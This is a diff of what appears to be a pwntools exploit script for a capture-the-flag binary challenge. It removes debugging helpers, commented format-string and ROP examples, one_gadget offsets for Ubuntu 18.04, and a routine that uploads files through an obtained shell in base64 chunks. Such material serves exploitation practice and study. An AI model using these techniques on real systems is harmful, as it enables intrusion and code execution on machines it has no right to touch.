@@ -18,7 +18,6 @@ def sa(a,b): return p.sendafter(a,b)
 def sl(a): return p.sendline(a)
 def sla(a,b): return p.sendlineafter(a, b)
 
-
 def r(a): return p.recv(a)
 def rl(): return p.recvline()
 def ru(a): return p.recvuntil(a)
@@ -33,122 +32,6 @@ def uint32(n):
 def uint64(n):
     return n & 0xFFFFFFFFFFFFFFFF
 
-  
-def debug(address):
-    if isinstance(p, process):
-        b = ''
-        if e.pie:
-            b = 'brva'
-        else:
-            b = 'b'
-        str = ''
-        for i in address:
-            if e.pie:
-                str += '%s 0x%x\n' % (b, i)
-            else:
-                str += '%s *0x%x\n' % (b, i)
-            
-        str += 'tracemalloc on\n'
-        #str += 'b malloc\n'
-        #str += 'b free\n'
-        gdb.attach(p, str)
-        raw_input()
-
-def get_one_gadgets(libc):
-    args = ["one_gadget", "-r"]
-    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
-        args += ["-b", libc.hex()]
-    else:
-        args += [libc]
-    return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
-# get_one_gadgets(l.path)
-'''
-Format string example
-
-# Assume a process that reads a string
-# and gives this string as the first argument
-# of a printf() call
-# It do this indefinitely
-p = process('./vulnerable')
-
-# Function called in order to send a payload
-def send_payload(payload):
-    log.info("payload = %s" % repr(payload))
-    p.sendline(payload)
-    return p.recv()
-
-# Create a FmtStr object and give to him the function
-format_string = FmtStr(execute_fmt=send_payload)
-format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
-format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
-format_string.execute_writes()
-'''
-
-
-'''
-Rop example
-
->>> context.clear(arch='amd64')
->>> assembly = 'pop rdx; pop rdi; pop rsi; add rsp, 0x20; ret; target: ret'
->>> binary = ELF.from_assembly(assembly)
->>> rop = ROP(binary)
->>> rop.target(1,2,3)
->>> rop.call(0xdeadbeef, [1, 2, 3])
->>> p = process(binary.path)
->>> p.send(str(rop))
-'''
-
-'''
-ubuntu18.04.2 one_gadget
-one_gadget = [0x4f2c5,0x4f322,0x10a38c]
-'''
-
-'''
-def str_to_hex(s):
-    tmp = ''
-    for i in s:
-        tmp += '\\x%02x' % ord(i)
-    return tmp
-
-with open('aa', 'rb') as f:
-    while True:
-        c = f.read(128)
-        if c:
-            p.sendline('echo -en "%s" >> aa' % str_to_hex(c))
-            # sleep(0.5)
-            p.recvuntil('$ ')
-        else:
-            break
-'''
-
-'''
-def send_command(cmd, print_cmd = True, print_resp = False):
-    if print_cmd:
-        log.info(cmd)
-
-    sla("$", cmd)
-    resp = p.recvuntil("$")
-
-    if print_resp:
-        log.info(resp)
-
-    p.unrecv("$")
-    return resp
-
-def send_file(src, dst):
-    file = read(src)	
-    f = b64e(file)
-
-    send_command("rm -f {}.b64".format(dst))
-    send_command("rm -f {}".format(dst))
-
-    size = 800
-    for i in range(len(f)//size + 1):
-        log.info("Sending chunk {}/{}".format(i, len(f)//size))
-        send_command("echo -n '{}' >> {}.b64".format(f[i*size:(i+1)*size], dst), False)
-
-    send_command("cat {}.b64 | base64 -d > {}".format(dst, dst))
-'''
 def set_key(key):
     sl('1')
     ru(': ')
